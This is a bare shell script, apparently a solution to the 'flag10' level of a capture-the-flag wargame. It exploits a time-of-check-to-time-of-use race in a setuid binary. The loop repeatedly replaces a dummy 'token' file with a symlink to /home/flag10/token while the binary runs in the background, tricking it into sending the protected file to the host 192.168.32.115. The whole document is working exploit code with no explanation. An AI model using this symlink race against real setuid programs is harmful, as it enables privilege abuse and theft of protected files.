#!/bin/sh

while :
do
    rm -f token
    touch token
    /home/flag10/flag10 token 192.168.32.115 &
    ln -sf /home/flag10/token token
done

